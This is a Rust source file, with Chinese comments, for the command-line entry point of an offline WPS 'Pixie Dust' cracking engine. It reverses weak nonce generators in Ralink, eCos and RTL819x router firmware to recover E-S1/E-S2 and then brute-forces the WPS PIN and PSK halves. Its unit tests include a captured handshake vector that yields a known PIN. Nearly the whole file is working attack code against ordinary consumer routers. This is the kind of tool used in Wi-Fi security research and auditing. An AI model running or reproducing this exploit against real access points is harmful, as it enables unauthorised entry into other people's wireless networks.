//! WCracking 离线 Pixie Dust 引擎（Rust 加速版）—— 命令行入口与模式调度。

mod crack;
mod crypto;
mod prng;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Instant;

use crack::crack;
use crypto::*;
use prng::*;

const MODE_RT: u32 = 1;
const MODE_ECOS_SIMPLE: u32 = 2;
const MODE_RTL819X: u32 = 3;
const MODE_ECOS_SIMPLEST: u32 = 4;
const MODE_ECOS_KNUTH: u32 = 5;
const MODE3_TRIES: u32 = 60 * 10;
const SEC_PER_DAY: u32 = 86400;

fn mode_name(m: u32) -> &'static str {
    match m {
        MODE_RT => "RT/MT/CL",
        MODE_ECOS_SIMPLE => "eCos simple",
        MODE_RTL819X => "RTL819x",
        MODE_ECOS_SIMPLEST => "eCos simplest",
        MODE_ECOS_KNUTH => "eCos Knuth",
        _ => "",
    }
}

type Inputs<'a> = (
    &'a [u8], // pke
    &'a [u8], // pkr
    &'a [u8], // e_hash1
    &'a [u8], // e_hash2
    &'a [u8], // authkey
    &'a [u8], // empty_psk
    &'a [u8], // e_nonce
);

fn try_rt_mode(inp: Inputs) -> Option<(Vec<u8>, Vec<u8>, u32)> {
    let (pke, pkr, h1, h2, authkey, empty_psk, e_nonce) = inp;
    let es = vec![0u8; WPS_SECRET_NONCE_LEN];
    if crack(authkey, empty_psk, &es, &es, pke, pkr, h1, h2).is_some() {
        return Some((es.clone(), es, 0));
    }
    // LFSR 反推
    let mut sreg = 0u32;
    for i in (0..WPS_NONCE_LEN).rev() {
        sreg = ralink_randstate_restore(sreg, e_nonce[i]);
    }
    let saved = sreg;
    let mut matched = true;
    for &b in e_nonce.iter().take(WPS_NONCE_LEN) {
        let (ns, out) = ralink_randbyte(sreg);
        sreg = ns;
        if out != b {
            matched = false;
            break;
        }
    }
    if matched {
        sreg = saved;
        let mut es2 = vec![0u8; WPS_SECRET_NONCE_LEN];
        for i in (0..WPS_SECRET_NONCE_LEN).rev() {
            let (ns, out) = ralink_randbyte_backwards(sreg);
            sreg = ns;
            es2[i] = out;
        }
        let mut es1 = vec![0u8; WPS_SECRET_NONCE_LEN];
        for i in (0..WPS_SECRET_NONCE_LEN).rev() {
            let (ns, out) = ralink_randbyte_backwards(sreg);
            sreg = ns;
            es1[i] = out;
        }
        if crack(authkey, empty_psk, &es1, &es2, pke, pkr, h1, h2).is_some() {
            return Some((es1, es2, saved));
        }
    }
    None
}

fn try_ecos_simple(inp: Inputs) -> Option<(Vec<u8>, Vec<u8>, u32)> {
    let (pke, pkr, h1, h2, authkey, empty_psk, e_nonce) = inp;
    let known = (e_nonce[0] as u32) << 25;
    let total: u32 = 0x0200_0000;
    let nthreads = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4)
        .min(32) as u32;
    let chunk = total / nthreads + 1;

    let found = Arc::new(AtomicBool::new(false));
    let result: Arc<Mutex<Option<(Vec<u8>, Vec<u8>, u32)>>> = Arc::new(Mutex::new(None));

    let mut handles = Vec::new();
    for t in 0..nthreads {
        let start = t * chunk;
        let end = ((t + 1) * chunk).min(total);
        let found = Arc::clone(&found);
        let result = Arc::clone(&result);
        let (e_nonce, pke, pkr, h1, h2, authkey, empty_psk) = (
            e_nonce.to_vec(), pke.to_vec(), pkr.to_vec(),
            h1.to_vec(), h2.to_vec(), authkey.to_vec(), empty_psk.to_vec(),
        );
        handles.push(std::thread::spawn(move || {
            for counter in start..end {
                if found.load(Ordering::Relaxed) {
                    break;
                }
                let seed = (known | counter) & 0xFFFF_FFFF;
                let mut s = seed;
                let mut matched = true;
                for i in 1..WPS_NONCE_LEN {
                    let (ns, out) = ecos_rand_simple(s);
                    s = ns;
                    if e_nonce[i] != (out & 0xFF) as u8 {
                        matched = false;
                        break;
                    }
                }
                if matched {
                    let mut es1 = Vec::with_capacity(WPS_SECRET_NONCE_LEN);
                    for _ in 0..WPS_SECRET_NONCE_LEN {
                        let (ns, out) = ecos_rand_simple(s);
                        s = ns;
                        es1.push((out & 0xFF) as u8);
                    }
                    let mut es2 = Vec::with_capacity(WPS_SECRET_NONCE_LEN);
                    for _ in 0..WPS_SECRET_NONCE_LEN {
                        let (ns, out) = ecos_rand_simple(s);
                        s = ns;
                        es2.push((out & 0xFF) as u8);
                    }
                    if crack(&authkey, &empty_psk, &es1, &es2, &pke, &pkr, &h1, &h2).is_some() {
                        let mut r = result.lock().unwrap();
                        if r.is_none() {
                            *r = Some((es1, es2, seed));
                        }
                        found.store(true, Ordering::Relaxed);
                        break;
                    }
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let r = result.lock().unwrap().clone();
    r
}

fn try_rtl819x(inp: Inputs, start: u32, end: u32) -> Option<(Vec<u8>, Vec<u8>, u32)> {
    let (pke, pkr, h1, h2, authkey, empty_psk, e_nonce) = inp;
    let mut randr = [0u32; 4];
    for i in 0..4 {
        randr[i] = u32::from_be_bytes([
            e_nonce[4 * i], e_nonce[4 * i + 1], e_nonce[4 * i + 2], e_nonce[4 * i + 3],
        ]);
    }
    // 找 nonce 种子
    let mut nonce_seed = 0u32;
    let mut seed = start;
    loop {
        if glibc_fast_seed(seed) == randr[0] && glibc_fast_nonce(seed) == randr {
            nonce_seed = seed;
            break;
        }
        if seed == 0 || seed <= end {
            break;
        }
        seed -= 1;
    }
    if nonce_seed == 0 && glibc_fast_seed(0) != randr[0] {
        return None;
    }

    let find_es1 = |seed: u32| -> Option<(Vec<u8>, String, [u8; WPS_PSK_LEN])> {
        let es = rtl_nonce_fill(seed).to_vec();
        let (st, half, psk) = crack::crack_first_half(authkey, empty_psk, &es, pke, pkr, h1);
        if st != 0 {
            Some((es, half, psk))
        } else {
            None
        }
    };

    let mut es1 = None;
    let mut half1 = String::new();
    if let Some((e, hf, _)) = find_es1(nonce_seed) {
        es1 = Some(e);
        half1 = hf;
    } else {
        for dist in 1..=MODE3_TRIES {
            let cand = nonce_seed.wrapping_add(dist);
            if let Some((e, hf, _)) = find_es1(cand) {
                es1 = Some(e);
                half1 = hf;
                break;
            }
            let cand = nonce_seed.wrapping_sub(dist);
            if let Some((e, hf, _)) = find_es1(cand) {
                es1 = Some(e);
                half1 = hf;
                break;
            }
        }
    }
    let es1 = es1?;
    for j in 0..10u32 {
        let es2 = rtl_nonce_fill(nonce_seed + j).to_vec();
        let (ok, pin, _) = crack::crack_second_half(authkey, empty_psk, &es2, pke, pkr, h2, &half1);
        if ok && !pin.is_empty() {
            return Some((es1.clone(), es2, nonce_seed));
        }
        // 也尝试完整 crack（部分设备）
        if crack(authkey, empty_psk, &es1, &es2, pke, pkr, h1, h2).is_some() {
            return Some((es1.clone(), es2, nonce_seed));
        }
    }
    None
}

fn try_ecos_simplest(inp: Inputs) -> Option<(Vec<u8>, Vec<u8>, u32)> {
    let (pke, pkr, h1, h2, authkey, empty_psk, e_nonce) = inp;
    let mut index = 0u32;
    loop {
        let mut s = index;
        let mut matched = true;
        for i in 0..WPS_NONCE_LEN {
            let (ns, out) = ecos_rand_simplest(s);
            s = ns;
            if e_nonce[i] != (out & 0xFF) as u8 {
                matched = false;
                break;
            }
        }
        if matched {
            let mut es1 = Vec::new();
            for _ in 0..WPS_SECRET_NONCE_LEN {
                let (ns, out) = ecos_rand_simplest(s);
                s = ns;
                es1.push((out & 0xFF) as u8);
            }
            let mut es2 = Vec::new();
            for _ in 0..WPS_SECRET_NONCE_LEN {
                let (ns, out) = ecos_rand_simplest(s);
                s = ns;
                es2.push((out & 0xFF) as u8);
            }
            if crack(authkey, empty_psk, &es1, &es2, pke, pkr, h1, h2).is_some() {
                return Some((es1, es2, index));
            }
        }
        index = index.wrapping_add(1);
        if index == 0xFFFF_FFFF {
            break;
        }
    }
    None
}

fn try_ecos_knuth(inp: Inputs) -> Option<(Vec<u8>, Vec<u8>, u32)> {
    let (pke, pkr, h1, h2, authkey, empty_psk, e_nonce) = inp;
    let mut index = 0u32;
    loop {
        let mut s = index;
        let mut matched = true;
        for i in 0..WPS_NONCE_LEN {
            let (ns, out) = ecos_rand_knuth(s);
            s = ns;
            if e_nonce[i] != (out & 0xFF) as u8 {
                matched = false;
                break;
            }
        }
        if matched {
            let mut es1 = Vec::new();
            for _ in 0..WPS_SECRET_NONCE_LEN {
                let (ns, out) = ecos_rand_knuth(s);
                s = ns;
                es1.push((out & 0xFF) as u8);
            }
            let mut es2 = Vec::new();
            for _ in 0..WPS_SECRET_NONCE_LEN {
                let (ns, out) = ecos_rand_knuth(s);
                s = ns;
                es2.push((out & 0xFF) as u8);
            }
            if crack(authkey, empty_psk, &es1, &es2, pke, pkr, h1, h2).is_some() {
                return Some((es1, es2, index));
            }
        }
        index = index.wrapping_add(1);
        if index == 0xFFFF_FFFF {
            break;
        }
    }
    None
}

struct Options {
    pke: String,
    pkr: String,
    e_hash1: String,
    e_hash2: String,
    e_nonce: String,
    authkey: Option<String>,
    r_nonce: Option<String>,
    e_bssid: Option<String>,
    mode: Option<u32>,
    force: bool,
}

fn parse_args(args: &[String]) -> Result<Options, String> {
    let mut o = Options {
        pke: String::new(),
        pkr: String::new(),
        e_hash1: String::new(),
        e_hash2: String::new(),
        e_nonce: String::new(),
        authkey: None,
        r_nonce: None,
        e_bssid: None,
        mode: None,
        force: false,
    };
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        macro_rules! next {
            () => {{
                i += 1;
                if i >= args.len() {
                    return Err(format!("参数 {} 缺少值", a));
                }
                args[i].clone()
            }};
        }
        match a {
            "-e" | "--pke" => o.pke = next!(),
            "-r" | "--pkr" => o.pkr = next!(),
            "-s" | "--e-hash1" => o.e_hash1 = next!(),
            "-z" | "--e-hash2" => o.e_hash2 = next!(),
            "-n" | "--e-nonce" => o.e_nonce = next!(),
            "-a" | "--authkey" => o.authkey = Some(next!()),
            "-m" | "--r-nonce" => o.r_nonce = Some(next!()),
            "-b" | "--e-bssid" => o.e_bssid = Some(next!()),
            "--mode" => o.mode = Some(next!().parse().map_err(|_| "mode 需为数字")?),
            "-f" | "--force" => o.force = true,
            _ => return Err(format!("未知参数 {}", a)),
        }
        i += 1;
    }
    Ok(o)
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let opts = match parse_args(&args) {
        Ok(o) => o,
        Err(e) => {
            eprintln!("参数错误: {}", e);
            eprintln!("用法: wcracking-engine -e <pke> -r <pkr> -s <h1> -z <h2> -a <authkey> -n <nonce> [--mode N] [-f]");
            std::process::exit(2);
        }
    };
    if opts.pke.is_empty() || opts.pkr.is_empty() || opts.e_hash1.is_empty()
        || opts.e_hash2.is_empty() || opts.e_nonce.is_empty() {
        eprintln!("缺少必填参数（pke/pkr/e-hash1/e-hash2/e-nonce）");
        std::process::exit(2);
    }

    let t0 = Instant::now();
    let pke = hex_to_bytes(&opts.pke);
    let pkr = hex_to_bytes(&opts.pkr);
    let h1 = hex_to_bytes(&opts.e_hash1);
    let h2 = hex_to_bytes(&opts.e_hash2);
    let n1 = hex_to_bytes(&opts.e_nonce);
    if pke.len() != WPS_PKEY_LEN || pkr.len() != WPS_PKEY_LEN
        || h1.len() != WPS_HASH_LEN || h2.len() != WPS_HASH_LEN || n1.len() != WPS_NONCE_LEN {
        eprintln!("输入长度错误");
        std::process::exit(2);
    }

    // AuthKey
    let authkey = match &opts.authkey {
        Some(a) => {
            let b = hex_to_bytes(a);
            if b.len() != WPS_AUTHKEY_LEN {
                eprintln!("authkey 长度错误");
                std::process::exit(2);
            }
            b
        }
        None => {
            let r_nonce = opts.r_nonce.as_ref().map(|s| hex_to_bytes(s));
            let bssid = opts.e_bssid.as_ref().map(|s| hex_to_bytes(s));
            match (r_nonce, bssid) {
                (Some(r), Some(b)) if r.len() == WPS_NONCE_LEN && b.len() == WPS_BSSID_LEN => {
                    let small = check_small_dh_keys(&pkr);
                    let dhkey = compute_dhkey(&pke, &pkr, small);
                    let mut kdk_in = Vec::new();
                    kdk_in.extend_from_slice(&n1);
                    kdk_in.extend_from_slice(&b);
                    kdk_in.extend_from_slice(&r);
                    let kdk = hmac_sha256(&dhkey, &kdk_in);
                    kdf(&kdk)[..WPS_AUTHKEY_LEN].to_vec()
                }
                _ => {
                    eprintln!("缺少 authkey 时需 r-nonce 与 e-bssid");
                    std::process::exit(2);
                }
            }
        }
    };
    let empty_psk = hmac_sha256(&authkey, b"");
    let inp: Inputs = (&pke, &pkr, &h1, &h2, &authkey, &empty_psk, &n1);

    // 模式顺序
    let mut modes: Vec<u32> = Vec::new();
    if let Some(m) = opts.mode {
        modes.push(m);
    } else if pke == hex_to_bytes(WPS_RTL_PKE_HEX) {
        modes.push(MODE_RTL819X);
    } else {
        modes.push(MODE_RT);
        if n1[0] & 0x80 == 0 && n1[4] & 0x80 == 0 && n1[8] & 0x80 == 0 && n1[12] & 0x80 == 0 {
            modes.push(MODE_RTL819X);
            modes.push(MODE_ECOS_SIMPLE);
        } else {
            modes.push(MODE_ECOS_SIMPLE);
        }
    }

    // 特殊情形（auto）
    if opts.mode.is_none() && pke != hex_to_bytes(WPS_RTL_PKE_HEX) {
        if let Some((pin, p1, p2)) = crack(&authkey, &empty_psk, &[0u8; 16], &[0u8; 16], &pke, &pkr, &h1, &h2) {
            print_result(MODE_RT, &pin, &[0u8; 16], &[0u8; 16], &p1, &p2, t0.elapsed().as_secs_f64());
            return;
        }
        if let Some((pin, p1, p2)) = crack(&authkey, &empty_psk, &n1, &n1, &pke, &pkr, &h1, &h2) {
            print_result(MODE_RTL819X, &pin, &n1, &n1, &p1, &p2, t0.elapsed().as_secs_f64());
            return;
        }
    }

    for m in modes {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as u32;
        let found = match m {
            MODE_RT => try_rt_mode(inp).map(|(e1, e2, seed)| (e1, e2, seed)),
            MODE_ECOS_SIMPLE => try_ecos_simple(inp).map(|(e1, e2, seed)| (e1, e2, seed)),
            MODE_RTL819X => {
                let (st, en) = if opts.force {
                    (now + 2 * SEC_PER_DAY, 0)
                } else {
                    (now + SEC_PER_DAY, now - SEC_PER_DAY)
                };
                try_rtl819x(inp, st, en).map(|(e1, e2, seed)| (e1, e2, seed))
            }
            MODE_ECOS_SIMPLEST => try_ecos_simplest(inp).map(|(e1, e2, seed)| (e1, e2, seed)),
            MODE_ECOS_KNUTH => try_ecos_knuth(inp).map(|(e1, e2, seed)| (e1, e2, seed)),
            _ => None,
        };
        if let Some((es1, es2, _seed)) = found {
            if let Some((pin, p1, p2)) = crack(&authkey, &empty_psk, &es1, &es2, &pke, &pkr, &h1, &h2) {
                print_result(m, &pin, &es1, &es2, &p1, &p2, t0.elapsed().as_secs_f64());
                return;
            }
        }
    }
    eprintln!("[-] WPS pin not found!");
    std::process::exit(1);
}

#[allow(clippy::too_many_arguments)]
fn print_result(
    mode: u32, pin: &str, es1: &[u8], es2: &[u8], p1: &[u8; 16], p2: &[u8; 16], elapsed: f64,
) {
    println!("[+] WPS pin: {}", if pin.is_empty() { "<empty>" } else { pin });
    println!("[?] Mode:    {} ({})", mode, mode_name(mode));
    println!("[*] ES1:     {}", to_hex(es1));
    println!("[*] ES2:     {}", to_hex(es2));
    println!("[*] PSK1:    {}", to_hex(p1));
    println!("[*] PSK2:    {}", to_hex(p2));
    println!();
    println!("[*] Time taken: {:.2} s", elapsed);
}

fn to_hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for x in b {
        s.push_str(&format!("{:02x}", x));
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crypto::*;
    use crate::prng::*;

    #[test]
    fn test_ecos_simple() {
        let mut s = 0x1234_5678u32;
        let expected = [
            (0x2e1d_6ab7u32, 0x0b6d_e897u32),
            (0x7789_ff42, 0x9994_bdbb),
            (0x2644_1989, 0x208d_5893),
            (0xafcf_d1bc, 0x93ae_fb57),
            (0xfbc5_81cb, 0x20c4_a7fd),
        ];
        for (i, &(es, eo)) in expected.iter().enumerate() {
            let (ns, out) = ecos_rand_simple(s);
            assert_eq!((ns, out), (es, eo), "ecos_simple[{i}] mismatch");
            s = ns;
        }
    }

    #[test]
    fn test_ecos_simplest_knuth() {
        let mut s = 0x1234_5678u32;
        for &e in &[0x0b71_9151u32, 0x6f47_bdb6, 0x2e1d_6ab7] {
            let (ns, out) = ecos_rand_simplest(s);
            assert_eq!((ns, out), (e, e));
            s = ns;
        }
        let mut s = 0x1234_5678u32;
        for &e in &[0x1abc_87d9u32, 0x6313_6599, 0x1672_ae6a] {
            let (ns, out) = ecos_rand_knuth(s);
            assert_eq!((ns, out), (e, e));
            s = ns;
        }
    }

    #[test]
    fn test_ralink() {
        assert_eq!(ralink_randbyte(0x1234_5678), (0x6c12_3441, 0x12));
        assert_eq!(ralink_randbyte_backwards(0x1234_5678), (0x3456_7e94, 0x38));
        assert_eq!(ralink_randstate_restore(0x1234_5678, 0xAB), 0xb456_423b);
    }

    #[test]
    fn test_glibc() {
        assert_eq!(
            glibc_fast_nonce(12345),
            [0x16d5_a847, 0x3328_a195, 0x1553_1bed, 0x1b26_cf3b]
        );
        assert_eq!(glibc_fast_seed(12345), 0x16d5_a847);
        assert_eq!(
            glibc_fast_nonce(1_750_000_000),
            [0x1b5f_7da0, 0x3476_3009, 0x3615_5c9d, 0x0261_d213]
        );
        let fill = rtl_nonce_fill(12345);
        assert_eq!(to_hex(&fill), "16d5a8473328a19515531bed1b26cf3b");
    }

    #[test]
    fn test_kdf() {
        // KDF 由 HMAC-SHA256 组成，用确定性输入校验输出非空且长度正确
        let kdk = hmac_sha256(b"dhkey", b"nonce||bssid||rnonce");
        let out = kdf(&kdk);
        assert_eq!(out.len(), 96);
    }

    #[test]
    fn test_full_crack_vector() {
        // 公开真实测试向量（ES1=ES2=0 场景），已知 PIN=04847533
        let authkey = hex_to_bytes(
            "7fde11b9691cde264a21a46feb3db8aaaad730090932b824439be09178e76f2c",
        );
        let pke = hex_to_bytes(
            "d438910d4e6e15fe70f097a8702ab894f57574bf64199f92829be02cc0a37548088f630a82370cb79542cf55caa5f0f76cb2c75f0e231844f42d00f1dad4942356c72cb0f687c777d0cc1135cfb74fbc448dca358a783d997f2bcf4421d8e20f3c7da472c8036f772ae9fac1e9a82c7465995ae0a526d9235e4eec5a0707ab80db3f5f187ffafaf15774b28da997a6c60aa5e0ec93092367f63eec1f5532a45d738fab9174cf1d798512c181f5eaa6689d8ec7c6be01dcd9f868801155d7446a",
        );
        let pkr = hex_to_bytes(
            "bcad542f88447c1269ef34314a171c92b1d7064c73be9fd3ed87637410460f468c36b5d4a0baaf859cb23042d75943755ad77996fbee7b66dbb7a8f9229ca5d3b8e7c0c45c58341f56a81a41a8d2e8f63ec93a93d99b595ca8e078846cfc05e876a3e63b33944aa9ff50fb60fa973b6dcc04f15e3624a9067af86b00e9719d89be9cb29c1fca6dd64dab463db3111f8d40f7c8a43948c5ca1bf630957dd96841ef0a37b24a37e4a4b0dd7ec1af3e66eabf160a7a8a050001a42977a9d481d40e",
        );
        let h1 = hex_to_bytes("905ff57d93e5c43c620d2665dd5957d5babaf1b73091727c549438081e133538");
        let h2 = hex_to_bytes("b02b075028e76e5ffa271b31928543cbc56aec73e227c3b980ec5bed88f01eec");
        let empty_psk = hmac_sha256(&authkey, b"");
        let es = [0u8; 16];
        let r = crack(&authkey, &empty_psk, &es, &es, &pke, &pkr, &h1, &h2);
        assert!(r.is_some());
        let (pin, psk1, psk2) = r.unwrap();
        assert_eq!(pin, "04847533");
        assert_eq!(to_hex(&psk1), "d4eb0c2a3815e1a03d70db7431eb53a3");
        assert_eq!(to_hex(&psk2), "d3b7e623f31d220a23ea07bb7f76658b");
    }
}
